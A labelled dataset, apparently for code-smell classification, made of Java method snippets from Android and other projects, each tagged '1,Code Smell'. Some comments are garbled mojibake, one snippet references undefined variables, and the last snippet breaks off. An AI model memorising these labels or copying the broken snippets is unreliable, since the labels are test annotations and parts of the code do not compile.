      Utils.showToastLong(this,R.string.remote_server_warning,disallowedServer);
      abort();
      return;
    }
    if (!settings.pcap_uri.isEmpty()) {
      persistableUriPermission.checkPermission(settings.pcap_uri,settings.pcapng_format,granted_uri -> {
        Log.d(TAG,""persistable uri granted? "" + granted_uri);
        if (granted_uri != null) {
          settings.pcap_uri=granted_uri.toString();
          mCapHelper.startCapture(settings);
        }
 else         abort();
      }
);
    }
 else     mCapHelper.startCapture(settings);
    return;
  }
 else   if (action.equals(ACTION_STOP)) {
    Log.d(TAG,""Stopping capture"");
    CaptureService.stopService();
    mStarterApp=null;
    CaptureService.waitForCaptureStop();
    putStats(res,CaptureService.getStats());
  }
 else   if (action.equals(ACTION_STATUS)) {
    Log.d(TAG,""Returning status"");
    res.putExtra(""running"",CaptureService.isServiceActive());
    res.putExtra(""version_name"",BuildConfig.VERSION_NAME);
    res.putExtra(""version_code"",BuildConfig.VERSION_CODE);
    putStats(res,CaptureService.getStats());
  }
 else {
    Log.e(TAG,""unknown action: "" + action);
    abort();
    return;
  }
  setResult(RESULT_OK,res);
  finish();
}
",1,Code Smell
"public static StoryEntry repostMessage(ArrayList<MessageObject> messageObjects){
  StoryEntry entry=new StoryEntry();
  entry.isRepostMessage=true;
  entry.messageObjects=messageObjects;
  entry.resultWidth=1080;
  entry.resultHeight=1920;
  MessageObject msg=messageObjects.get(0);
  entry.backgroundWallpaperPeerId=getRepostDialogId(msg);
  VideoEditedInfo.MediaEntity entity=new VideoEditedInfo.MediaEntity();
  entity.type=VideoEditedInfo.MediaEntity.TYPE_MESSAGE;
  entity.x=0.5f;
  entity.y=0.5f;
  entry.mediaEntities=new ArrayList<>();
  entry.mediaEntities.add(entity);
  if (messageObjects.size() == 1) {
    MessageObject messageObject=messageObjects.get(0);
    if (messageObject != null && (messageObject.type == MessageObject.TYPE_GIF || messageObject.type == MessageObject.TYPE_VIDEO || messageObject.type == MessageObject.TYPE_ROUND_VIDEO)) {
      if (messageObject.messageOwner != null && messageObject.messageOwner.attachPath != null) {
        entry.file=new File(messageObject.messageOwner.attachPath);
      }
      if (entry.file == null || !entry.file.exists()) {
        entry.file=FileLoader.getInstance(entry.currentAccount).getPathToMessage(messageObject.messageOwner);
      }
      if (entry.file != null && entry.file.exists()) {
        entry.isVideo=true;
        entry.fileDeletable=false;
        entry.duration=(long)(messageObject.getDuration() * 1000);
        entry.left=0;
        entry.right=Math.min(1,59_500f / entry.duration);
      }
 else {
        entry.file=null;
      }
    }
  }
  return entry;
}",1,Code Smell
"/** 
 * Paints a selection. <p> The bounds of the painted selection (rounded) rectangle are {@code x + insets.left, y + insets.top, width - insets.left - insets.right, height - insets.top - insets.bottom}. The given arc radius refers to the painted rectangle (and not to  {@code x,y,width,height}).
 * @since 3
 */
public static void paintSelection(Graphics2D g,int x,int y,int width,int height,Insets insets,float arcTopLeft,float arcTopRight,float arcBottomLeft,float arcBottomRight,int flags){
  if (insets != null) {
    x+=insets.left;
    y+=insets.top;
    width-=insets.left + insets.right;
    height-=insets.top + insets.bottom;
  }
  if (arcTopLeft > 0 || arcTopRight > 0 || arcBottomLeft > 0 || arcBottomRight > 0) {
    double systemScaleFactor=UIScale.getSystemScaleFactor(g);
    if (systemScaleFactor != (int)systemScaleFactor) {
      HiDPIUtils.paintAtScale1x(g,x,y,width,height,(g2d,x2,y2,width2,height2,scaleFactor) -> {
        paintRoundedSelectionImpl(g2d,x2,y2,width2,height2,(float)(arcTopLeft * scaleFactor),(float)(arcTopRight * scaleFactor),(float)(arcBottomLeft * scaleFactor),(float)(arcBottomRight * scaleFactor));
      }
);
    }
 else     paintRoundedSelectionImpl(g,x,y,width,height,arcTopLeft,arcTopRight,arcBottomLeft,arcBottomRight);
  }
 else   g.fillRect(x,y,width,height);
}",1,Code Smell
"private static String processClassLoaderString43OrLater(String input){
  int start=input.indexOf(""DexPathList"") + ""DexPathList"".length();
  if (input.length() > start + 4) {
    String trimmed=input.substring(start);
    int end=trimmed.indexOf(']');
    if (trimmed.charAt(0) == '[' && trimmed.charAt(1) == '[' && end >= 0) {
      trimmed=trimmed.substring(2,end);
      String[] split=trimmed.split("","");
      for (int i=0; i < split.length; i++) {
        int quoteStart=split[i].indexOf('""');
        int quoteEnd=split[i].lastIndexOf('""');
        if (quoteStart > 0 && quoteStart < quoteEnd) {
          split[i]=split[i].substring(quoteStart + 1,quoteEnd);
        }
      }
      StringBuilder sb=new StringBuilder();
      for (      String s : split) {
        if (sb.length() > 0) {
          sb.append(':');
        }
        sb.append(s);
      }
      return sb.toString();
    }
  }
  return input;
}",1,Code Smell
"/** 
 * 传出y年m月d日对应的农历.year0 .month1 .day2 .yearCyl3 .monCyl4 .dayCyl5 .isLeap6
 * @param y 年
 * @param m 月
 * @param d 日
 * @return y年m月d日对应的农历
 */
public static long[] calElement(int y,int m,int d){
  long[] nongDate=new long[7];
  int i=0, temp=0, leap=0;
  Date baseDate=new GregorianCalendar(1900,0,31).getTime();
  Date objDate=new GregorianCalendar(y,m - 1,d).getTime();
  long offset=(objDate.getTime() - baseDate.getTime()) / 86400000L;
  nongDate[5]=offset + 40;
  nongDate[4]=14;
  for (i=1900; i < 2100 && offset > 0; i++) {
    temp=lYearDays(i);
    offset-=temp;
    nongDate[4]+=12;
  }
  if (offset < 0) {
    offset+=temp;
    i--;
    nongDate[4]-=12;
  }
  nongDate[0]=i;
  nongDate[3]=i - 1864;
  leap=leapMonth(i);
  nongDate[6]=0;
  for (i=1; i < 13 && offset > 0; i++) {
    if (leap > 0 && i == (leap + 1) && nongDate[6] == 0) {
      --i;
      nongDate[6]=1;
      temp=leapDays((int)nongDate[0]);
    }
 else {
      temp=monthDays((int)nongDate[0],i);
    }
    if (nongDate[6] == 1 && i == (leap + 1)) {
      nongDate[6]=0;
    }
    offset-=temp;
    if (nongDate[6] == 0) {
      nongDate[4]++;
    }
  }
  if (offset == 0 && leap > 0 && i == leap + 1) {
    if (nongDate[6] == 1) {
      nongDate[6]=0;
    }
 else {
      nongDate[6]=1;
      --i;
      --nongDate[4];
    }
  }
  if (offset < 0) {
    offset+=temp;
    --i;
    --nongDate[4];
  }
  nongDate[1]=i;
  nongDate[2]=offset + 1;
  return nongDate;
}",1,Code Smell
"private static void crashHandler(Thread thread,Throwable throwable){
  if (Looper.getMainLooper().getThread() != thread) {
    logger.error(""Uncaught exception on thread "" + thread.getName(),throwable);
    return;
  }
  new Thread(){
    @Override public void run(){
      Looper.prepare();
      String badPlugin=null;
      boolean disabledPlugin=false;
      for (      StackTraceElement ele : throwable.getStackTrace()) {
        String className=ele.getClassName();
        for (        Map.Entry<PathClassLoader,Plugin> entry : PluginManager.classLoaders.entrySet()) {
          try {
            var loadedClass=entry.getKey().loadClass(className);
            if (!loadedClass.getClassLoader().equals(entry.getKey())) {
              continue;
            }
            badPlugin=entry.getValue().getName();
            if (Main.settings.getBool(AliucordPageKt.AUTO_DISABLE_ON_CRASH_KEY,true)) {
              disabledPlugin=true;
              Main.settings.setBool(PluginManager.getPluginPrefKey(badPlugin),false);
            }
            break;
          }
 catch (          ClassNotFoundException ignored) {
          }
        }
        if (badPlugin != null) {
          break;
        }
      }
      File folder=new File(Constants.CRASHLOGS_PATH);
      if (folder.exists() || folder.mkdir()) {
        File file=new File(folder,new Timestamp(System.currentTimeMillis()).toString().replaceAll("":"",""_"") + "".txt"");
        try (PrintStream ps=new PrintStream(file)){
          throwable.printStackTrace(ps);
        }
 catch (        FileNotFoundException ignored) {
        }
      }
      var sb=new StringBuilder(""An unrecoverable crash occurred. "");
      if (badPlugin != null) {
        sb.append(""This crash was caused by "").append(badPlugin);
        if (disabledPlugin) {
          sb.append("", so I automatically disabled it for you"");
        }
        sb.append("". "");
      }
      sb.append(""Check the crashes section in the settings for more info."");
      Toast.makeText(Utils.getAppContext(),sb.toString(),Toast.LENGTH_LONG).show();
      Looper.loop();
    }
  }
.start();
  try {
    Thread.sleep(4200);
  }
 catch (  InterruptedException ignored) {
  }
  System.exit(2);
}",1,Code Smell
"private void updateNavigation(){
  if (!isVisible() || !isAttachedToWindow) {
    return;
  }
  boolean enableSeeking=false;
  boolean enablePrevious=false;
  boolean enableRewind=false;
  boolean enableFastForward=false;
  boolean enableNext=false;
  if (player != null) {
    Timeline timeline=player.getCurrentTimeline();
    if (!timeline.isEmpty() && !player.isPlayingAd()) {
      timeline.getWindow(player.getCurrentWindowIndex(),window);
      boolean isSeekable=window.isSeekable;
      enableSeeking=isSeekable;
      enablePrevious=isSeekable || !window.isDynamic || player.hasPrevious();
      enableRewind=isSeekable && rewindMs > 0;
      enableFastForward=isSeekable && fastForwardMs > 0;
      enableNext=window.isDynamic || player.hasNext();
    }
  }
  setButtonEnabled(enablePrevious,previousButton);
  setButtonEnabled(enableRewind,rewindButton);
  setButtonEnabled(enableFastForward,fastForwardButton);
  setButtonEnabled(enableNext,nextButton);
  if (timeBar != null) {
    timeBar.setEnabled(enableSeeking);
  }
}",1,Code Smell
"@EventHandler private void onKey(KeyEvent event){
  if (event.action != KeyAction.Press || !selectionBind.get().isPressed() || mc.currentScreen != null) {
    return;
  }
  selectCorners();
}
",1,Code Smell
"@Override public void onUserVideoStateChanged(String userId,TUIRoomDefine.VideoStreamType streamType,boolean hasVideo,TUIRoomDefine.ChangeReason reason){
  Log.d(TAG,""onUserVideoStateChanged userId="" + userId + "" hasVideo=""+ hasVideo+ "" type=""+ streamType);
  if (TextUtils.equals(userId,mConferenceState.userModel.userId) && streamType == CAMERA_STREAM_LOW) {
    return;
  }
  if (TextUtils.equals(userId,mConferenceState.userModel.userId) && streamType == CAMERA_STREAM) {
    mMediaState.isCameraOpened.set(hasVideo);
  }
  if (streamType == SCREEN_STREAM) {
    mConferenceState.handleUserScreenStateChanged(userId,hasVideo);
    mUserState.updateUserScreenState(userId,hasVideo);
  }
 else {
    mConferenceState.updateUserCameraState(userId,streamType,hasVideo,reason);
    mUserState.updateUserCameraState(userId,hasVideo,streamType);
  }
  if (TextUtils.equals(userId,mConferenceState.userModel.userId) && streamType == SCREEN_STREAM && !hasVideo && reason == TUIRoomDefine.ChangeReason.BY_ADMIN) {
    ConferenceEventCenter.getInstance().notifyEngineEvent(ConferenceEventCenter.RoomEngineEvent.LOCAL_SHARE_STOPPED_BY_ADMIN,null);
  }
}
",1,Code Smell
"@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  setPivotX(getMeasuredWidth() / 2);
  setPivotY(getMeasuredHeight());
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  if (bubbleX != null) {
    setPivotX(bubbleX);
  }
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(heightMeasureSpec) + AndroidUtilities.dp(36),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  if (bubbleX != null) {
    setPivotX(bubbleX);
  }
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(52),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(AndroidUtilities.dp(26)),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(30),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  setPadding(AndroidUtilities.dp(5),AndroidUtilities.dp(8),AndroidUtilities.dp(5),AndroidUtilities.dp(8));
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(44) + getPaddingTop() + getPaddingBottom(),MeasureSpec.EXACTLY));
}
@Override public void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(MeasureSpec.makeMeasureSpec(View.MeasureSpec.getSize(widthMeasureSpec),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(View.MeasureSpec.getSize(widthMeasureSpec),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  if (drawBackground && type != TYPE_TOPIC_ICON && type != TYPE_AVATAR_CONSTRUCTOR) {
    super.onMeasure(MeasureSpec.makeMeasureSpec((int)Math.min(AndroidUtilities.dp(340 - 16),AndroidUtilities.displaySize.x * .95f),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec((int)Math.min(AndroidUtilities.dp(410 - 16 - 64),AndroidUtilities.displaySize.y * .75f),MeasureSpec.AT_MOST));
  }
 else {
    super.onMeasure(widthMeasureSpec,heightMeasureSpec);
  }
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(widthMeasureSpec,MeasureSpec.makeMeasureSpec(AndroidUtilities.dp(8 + 36 + 8),MeasureSpec.EXACTLY));
}
@Override protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec){
  super.onMeasure(MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(widthMeasureSpec),MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(MeasureSpec.getSize(heightMeasureSpec),MeasureSpec.EXACTLY));
}",1,Code Smell
"@Override protected Task<VersionUpdatedEvent> createTask(){
  return new Task<>(){
    protected VersionUpdatedEvent call(){
      try {
        VersionCheck versionCheck=getVersionCheck();
        version=versionCheck.version;
        if (isNewer(versionCheck) && verifySignature(versionCheck)) {
          return new VersionUpdatedEvent(versionCheck.version);
        }
      }
 catch (      IOException e) {
        log.error(""Error retrieving version check file"",e);
      }
      return null;
    }
  }
;
}
",1,Code Smell
"static List<DataSetField> extract(JsonSchema jsonSchema,KafkaPath topicOddrn,boolean isKey){
  Schema schema=jsonSchema.rawSchema();
  List<DataSetField> result=new ArrayList<>();
  result.add(DataSetFieldsExtractors.rootField(topicOddrn,isKey));
  extract(schema,topicOddrn.oddrn() + ""/columns/"" + (isKey ? ""key"" : ""value""),null,null,null,ImmutableSet.of(),result);
  return result;
}
private static void extract(Schema schema,String parentOddr,String oddrn,String name,Boolean nullable,ImmutableSet<String> registeredRecords,List<DataSetField> sink){
  if (schema instanceof ReferenceSchema) {
    Optional.ofNullable(s.getReferredSchema()).ifPresent(refSchema -> extract(refSchema,parentOddr,oddrn,name,nullable,registeredRecords,sink));
  }
 else   if (schema instanceof ObjectSchema) {
    extractObject(s,parentOddr,oddrn,name,nullable,registeredRecords,sink);
  }
 else   if (schema instanceof ArraySchema) {
    extractArray(s,parentOddr,oddrn,name,nullable,registeredRecords,sink);
  }
 else   if (schema instanceof CombinedSchema) {
    extractCombined(cs,parentOddr,oddrn,name,nullable,registeredRecords,sink);
  }
 else   if (schema instanceof BooleanSchema || schema instanceof NumberSchema || schema instanceof StringSchema|| schema instanceof NullSchema) {
    extractPrimitive(schema,parentOddr,oddrn,name,nullable,sink);
  }
 else {
    extractUnknown(schema,parentOddr,oddrn,name,nullable,sink);
  }
}
",1,Code Smell
"public void reloadRules(){
switch (mType) {
case MALWARE_WHITELIST:
    CaptureService.reloadMalwareWhitelist();
  break;
case BLOCKLIST:
if (CaptureService.isServiceActive()) CaptureService.requireInstance().reloadBlocklist();
break;
case FIREWALL_WHITELIST:
if (CaptureService.isServiceActive()) CaptureService.requireInstance().reloadFirewallWhitelist();
break;
case DECRYPTION_LIST:
CaptureService.reloadDecryptionList();
break;
}
}
",1,Code Smell
"@Override protected void read(CompoundTag compound,boolean clientPacket){
  super.read(compound,clientPacket);
  int prev=airLevel;
  airLevel=compound.getInt(""Air"");
  airLevelTimer=compound.getInt(""Timer"");
  capacityEnchantLevel=compound.getInt(""CapacityEnchantment"");
  if (compound.contains(""CustomName"",8))   this.customName=Component.Serializer.fromJson(compound.getString(""CustomName""));
  vanillaTag=compound.getCompound(""VanillaTag"");
  forgeCapsTag=compound.contains(""ForgeCapsTag"") ? compound.getCompound(""ForgeCapsTag"") : null;
  if (prev != 0 && prev != airLevel && airLevel == BacktankUtil.maxAir(capacityEnchantLevel) && clientPacket)   playFilledEffect();
}",1,Code Smell
"@SuppressWarnings(""TryWithIdenticalCatches"") public static void unregisterOnActivityDestroyListener(Preference preference,PreferenceManager.OnActivityDestroyListener listener){
  if (null == mUnregisterOnActivityDestroyListener || null == preference || null == listener) {
    return;
  }
  PreferenceManager preferenceManager=preference.getPreferenceManager();
  if (null == preferenceManager) {
    return;
  }
  try {
    mUnregisterOnActivityDestroyListener.invoke(preferenceManager,listener);
  }
 catch (  IllegalAccessException e) {
    e.printStackTrace();
  }
catch (  InvocationTargetException e) {
    e.printStackTrace();
  }
}
",1,Code Smell
"public boolean onTouch(int action,float x,float y){
  if (action == MotionEvent.ACTION_DOWN) {
    if (0 <= x && x <= width && y >= 0 && y <= height) {
      startX=x;
      pressed=true;
      thumbDX=(int)(x - thumbX);
      startDraging=false;
      delegate.onSeekBarPressed();
      return true;
    }
  }
 else   if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
    if (pressed) {
      if (action == MotionEvent.ACTION_UP && delegate != null) {
        delegate.onSeekBarDrag((float)thumbX / (float)width);
      }
      pressed=false;
      delegate.onSeekBarReleased();
      return true;
    }
  }
 else   if (action == MotionEvent.ACTION_MOVE) {
    if (pressed) {
      if (startDraging) {
        thumbX=(int)(x - thumbDX);
        if (thumbX < 0) {
          thumbX=0;
        }
 else         if (thumbX > width) {
          thumbX=width;
        }
        this.progress=thumbX / (float)width;
      }
      if (startX != -1 && Math.abs(x - startX) > AndroidUtilities.getPixelsInCM(0.2f,true)) {
        if (parentView != null && parentView.getParent() != null) {
          parentView.getParent().requestDisallowInterceptTouchEvent(true);
        }
        startDraging=true;
        startX=-1;
      }
      return true;
    }
  }
  return false;
}",1,Code Smell
"@Override public void updateRemotePreferences(String group,Bundle diff) throws RemoteException {
  var userId=ensureModule();
  Map<String,Object> values=new ArrayMap<>();
  if (diff.containsKey(""delete"")) {
    var deletes=(Set<?>)diff.getSerializable(""delete"");
    for (    var key : deletes) {
      values.put((String)key,null);
    }
  }
  if (diff.containsKey(""put"")) {
    try {
      var puts=(Map<?,?>)diff.getSerializable(""put"");
      for (      var entry : puts.entrySet()) {
        values.put((String)entry.getKey(),entry.getValue());
      }
    }
 catch (    Throwable e) {
      Log.e(TAG,""updateRemotePreferences: "",e);
    }
  }
  try {
    ConfigManager.getInstance().updateModulePrefs(loadedModule.packageName,userId,group,values);
    ((LSPInjectedModuleService)loadedModule.service).onUpdateRemotePreferences(group,diff);
  }
 catch (  Throwable e) {
    throw new RemoteException(e.getMessage());
  }
}
",1,Code Smell
"/** 
 * 添加
 */
@RequestMapping(value=""/goods/save"",method=RequestMethod.POST) @ResponseBody public Result save(@RequestBody NewBeeMallGoods newBeeMallGoods){
  if (!StringUtils.hasText(newBeeMallGoods.getGoodsName()) || !StringUtils.hasText(newBeeMallGoods.getGoodsIntro()) || !StringUtils.hasText(newBeeMallGoods.getTag())|| Objects.isNull(newBeeMallGoods.getOriginalPrice())|| Objects.isNull(newBeeMallGoods.getGoodsCategoryId())|| Objects.isNull(newBeeMallGoods.getSellingPrice())|| Objects.isNull(newBeeMallGoods.getStockNum())|| Objects.isNull(newBeeMallGoods.getGoodsSellStatus())|| !StringUtils.hasText(newBeeMallGoods.getGoodsCoverImg())|| !StringUtils.hasText(newBeeMallGoods.getGoodsDetailContent())) {
    return ResultGenerator.genFailResult(""参数异常！"");
  }
  String result=newBeeMallGoodsService.saveNewBeeMallGoods(newBeeMallGoods);
  if (ServiceResultEnum.SUCCESS.getResult().equals(result)) {
    return ResultGenerator.genSuccessResult();
  }
 else {
    return ResultGenerator.genFailResult(result);
  }
}
",1,Code Smell
"public static boolean isIdenticalAfterCapitalizeEachWord(@Nonnull final String text,@Nonnull final int[] sortedSeparators){
  boolean needsCapsNext=true;
  final int len=text.length();
  for (int i=0; i < len; i=text.offsetByCodePoints(i,1)) {
    final int codePoint=text.codePointAt(i);
    if (Character.isLetter(codePoint)) {
      if ((needsCapsNext && !Character.isUpperCase(codePoint)) || (!needsCapsNext && !Character.isLowerCase(codePoint))) {
        return false;
      }
    }
    needsCapsNext=(Arrays.binarySearch(sortedSeparators,codePoint) >= 0);
  }
  return true;
}",1,Code Smell
"/** 
 * 鍋滄绾跨▼姹 鍏堜娇鐢╯hutdown, 鍋滄鎺ユ敹鏂颁换鍔″苟灏濊瘯瀹屾垚鎵鏈夊凡瀛樺湪浠诲姟. 濡傛灉瓒呮椂, 鍒欒皟鐢╯hutdownNow, 鍙栨秷鍦╳orkQueue涓璓ending鐨勪换鍔,骞朵腑鏂墍鏈夐樆濉炲嚱鏁. 濡傛灉浠嶇劧瓒呮檪锛屽墖寮峰埗閫鍑. 鍙﹀鍦╯hutdown鏃剁嚎绋嬫湰韬璋冪敤涓柇鍋氫簡澶勭悊.
 */
public static void shutdownAndAwaitTermination(ExecutorService pool){
  if (pool != null && !pool.isShutdown()) {
    pool.shutdown();
    try {
      if (!pool.awaitTermination(120,TimeUnit.SECONDS)) {
        pool.shutdownNow();
        if (!pool.awaitTermination(120,TimeUnit.SECONDS)) {
          logger.info(""Pool did not terminate"");
        }
      }
    }
 catch (    InterruptedException ie) {
      pool.shutdownNow();
      Thread.currentThread().interrupt();
    }
  }
}",1,Code Smell
"public void generateLinkDescription(){
  if (linkDescription != null) {
    return;
  }
  boolean allowUsernames=false;
  int hashtagsType=0;
  TLRPC.WebPage webpage=null;
  if (storyMentionWebpage != null) {
    webpage=storyMentionWebpage;
  }
 else   if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaWebPage) {
    webpage=((TLRPC.TL_messageMediaWebPage)getMedia(messageOwner)).webpage;
  }
  if (webpage != null) {
    for (int i=0; i < webpage.attributes.size(); ++i) {
      TLRPC.WebPageAttribute attr=webpage.attributes.get(i);
      if (attr instanceof TLRPC.TL_webPageAttributeStory) {
        TLRPC.TL_webPageAttributeStory storyAttr=(TLRPC.TL_webPageAttributeStory)attr;
        if (storyAttr.storyItem != null && storyAttr.storyItem.caption != null) {
          linkDescription=new SpannableStringBuilder(storyAttr.storyItem.caption);
          webPageDescriptionEntities=storyAttr.storyItem.entities;
          allowUsernames=true;
          break;
        }
      }
    }
  }
  if (linkDescription == null) {
    if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaWebPage && getMedia(messageOwner).webpage instanceof TLRPC.TL_webPage && getMedia(messageOwner).webpage.description != null) {
      linkDescription=Spannable.Factory.getInstance().newSpannable(getMedia(messageOwner).webpage.description);
      String siteName=getMedia(messageOwner).webpage.site_name;
      if (siteName != null) {
        siteName=siteName.toLowerCase();
      }
      if (""instagram"".equals(siteName)) {
        hashtagsType=1;
      }
 else       if (""twitter"".equals(siteName)) {
        hashtagsType=2;
      }
    }
 else     if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaGame && getMedia(messageOwner).game.description != null) {
      linkDescription=Spannable.Factory.getInstance().newSpannable(getMedia(messageOwner).game.description);
    }
 else     if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaInvoice && getMedia(messageOwner).description != null) {
      linkDescription=Spannable.Factory.getInstance().newSpannable(getMedia(messageOwner).description);
    }
  }
  if (!TextUtils.isEmpty(linkDescription)) {
    if (containsUrls(linkDescription)) {
      try {
        AndroidUtilities.addLinksSafe((Spannable)linkDescription,Linkify.WEB_URLS,false,true);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
    linkDescription=Emoji.replaceEmoji(linkDescription,Theme.chat_msgTextPaint.getFontMetricsInt(),dp(20),false);
    if (webPageDescriptionEntities != null) {
      addEntitiesToText(linkDescription,webPageDescriptionEntities,isOut(),allowUsernames,false,!allowUsernames);
      replaceAnimatedEmoji(linkDescription,webPageDescriptionEntities,Theme.chat_msgTextPaint.getFontMetricsInt());
    }
    if (hashtagsType != 0) {
      if (!(linkDescription instanceof Spannable)) {
        linkDescription=new SpannableStringBuilder(linkDescription);
      }
      addUrlsByPattern(isOutOwner(),linkDescription,false,hashtagsType,0,false);
    }
  }
}",1,Code Smell
"void updateGroupName(){
  if ((groupInfo.type != GroupInfo.GroupType.Restricted && groupInfo.type != GroupInfo.GroupType.Organization) || (selfGroupMember.type == GroupMember.GroupMemberType.Manager || selfGroupMember.type == GroupMember.GroupMemberType.Owner)) {
    Intent intent=new Intent(getActivity(),SetGroupNameActivity.class);
    intent.putExtra(""groupInfo"",groupInfo);
    startActivity(intent);
  }
}
",1,Code Smell
"@Override public void onClick(View v){
  Integer position=(Integer)v.getTag();
  if (listener != null && position != null && position >= 0 && position < dataList.size()) {
    T data=dataList.get(position);
    listener.onItemClick(data,position);
  }
}",1,Code Smell
"/** 
 * Returns the media sequence number of the segment to load next in  {@code mediaPlaylist}.
 * @param previous The last (at least partially) loaded segment.
 * @param switchingTrack Whether the segment to load is not preceded by a segment in the sametrack.
 * @param mediaPlaylist The media playlist to which the segment to load belongs.
 * @param startOfPlaylistInPeriodUs The start of {@code mediaPlaylist} relative to the periodstart in microseconds.
 * @param loadPositionUs The current load position relative to the period start in microseconds.
 * @return The media sequence of the segment to load.
 */
private long getChunkMediaSequence(@Nullable HlsMediaChunk previous,boolean switchingTrack,HlsMediaPlaylist mediaPlaylist,long startOfPlaylistInPeriodUs,long loadPositionUs){
  if (previous == null || switchingTrack) {
    long endOfPlaylistInPeriodUs=startOfPlaylistInPeriodUs + mediaPlaylist.durationUs;
    long targetPositionInPeriodUs=(previous == null || independentSegments) ? loadPositionUs : previous.startTimeUs;
    if (!mediaPlaylist.hasEndTag && targetPositionInPeriodUs >= endOfPlaylistInPeriodUs) {
      return mediaPlaylist.mediaSequence + mediaPlaylist.segments.size();
    }
    long targetPositionInPlaylistUs=targetPositionInPeriodUs - startOfPlaylistInPeriodUs;
    return Util.binarySearchFloor(mediaPlaylist.segments,targetPositionInPlaylistUs,true,!playlistTracker.isLive() || previous == null) + mediaPlaylist.mediaSequence;
  }
  return previous.getNextChunkIndex();
}
",1,Code Smell
"private void handleGroupEvent(String subKey,Map<String,Object> param){
  if (TextUtils.equals(subKey,TUIConstants.TUIContact.EVENT_SUB_KEY_EXIT_GROUP) || TextUtils.equals(subKey,TUIConstants.TUIContact.EVENT_SUB_KEY_GROUP_DISMISS) || TextUtils.equals(subKey,TUIConstants.TUIContact.EVENT_SUB_KEY_GROUP_RECYCLE)) {
    ConversationEventListener eventListener=getConversationEventListener();
    String groupId=null;
    if (param != null) {
      groupId=(String)getOrDefault(param.get(TUIConstants.TUIContact.GROUP_ID),"""");
    }
    if (eventListener != null) {
      eventListener.deleteConversation(groupId,true);
    }
    List<ConversationEventListener> conversationEventObserverList=getConversationEventListenerList();
    for (    ConversationEventListener conversationEventObserver : conversationEventObserverList) {
      conversationEventObserver.deleteConversation(groupId,true);
    }
  }
 else   if (TextUtils.equals(subKey,TUIConstants.TUIContact.EVENT_SUB_KEY_MEMBER_KICKED_GROUP)) {
    if (param == null) {
      return;
    }
    String groupId=(String)getOrDefault(param.get(TUIConstants.TUIContact.GROUP_ID),"""");
    ArrayList<String> memberList=(ArrayList<String>)param.get(TUIConstants.TUIContact.GROUP_MEMBER_ID_LIST);
    if (TextUtils.isEmpty(groupId) || memberList == null || memberList.isEmpty()) {
      return;
    }
    for (    String id : memberList) {
      if (TextUtils.equals(id,TUILogin.getLoginUser())) {
        ConversationEventListener eventListener=getConversationEventListener();
        if (eventListener != null) {
          eventListener.deleteConversation(groupId,true);
        }
        List<ConversationEventListener> conversationEventObserverList=getConversationEventListenerList();
        for (        ConversationEventListener conversationEventObserver : conversationEventObserverList) {
          conversationEventObserver.deleteConversation(groupId,true);
        }
        break;
      }
    }
  }
 else   if (TextUtils.equals(subKey,TUIConstants.TUIContact.EVENT_SUB_KEY_CLEAR_GROUP_MESSAGE)) {
    String groupId=(String)getOrDefault(param.get(TUIConstants.TUIContact.GROUP_ID),"""");
    ConversationEventListener eventListener=getConversationEventListener();
    if (eventListener != null) {
      eventListener.clearConversationMessage(groupId,true);
    }
    List<ConversationEventListener> conversationEventObserverList=getConversationEventListenerList();
    for (    ConversationEventListener conversationEventObserver : conversationEventObserverList) {
      conversationEventObserver.clearConversationMessage(groupId,true);
    }
  }
}
",1,Code Smell
"/** 
 * 娣诲姞(閿佸畾/瑙ｉ攣)璁板綍
 */
public List<Content> addIsLockRecord(List<String> ids,Integer isLock){
  List<Content> contentList=new ArrayList<>();
  for (  String actionId : ids) {
    String name=crmCustomerService.lambdaQuery().select(CrmCustomer::getCustomerName).eq(CrmCustomer::getCustomerId,actionId).one().getCustomerName();
    String detail;
    if (isLock == 2) {
      detail=""灏嗗鎴凤細"" + name + ""閿佸畾"";
      contentList.add(new Content(name,detail,BehaviorEnum.LOCK));
    }
 else {
      detail=""灏嗗鎴凤細"" + name + ""瑙ｉ攣"";
      contentList.add(new Content(name,detail,BehaviorEnum.UNLOCK));
    }
  }
  return contentList;
}",1,Code Smell
"public void onStartInput(final EditorInfo editorInfo,final boolean restarting){
  if (hasMessages(MSG_PENDING_IMS_CALLBACK)) {
    mHasPendingStartInput=true;
  }
 else {
    if (mIsOrientationChanging && restarting) {
      mIsOrientationChanging=false;
      mPendingSuccessiveImsCallback=true;
    }
    final LatinIME latinIme=getOwnerInstance();
    if (latinIme != null) {
      executePendingImsCallback(latinIme,editorInfo,restarting);
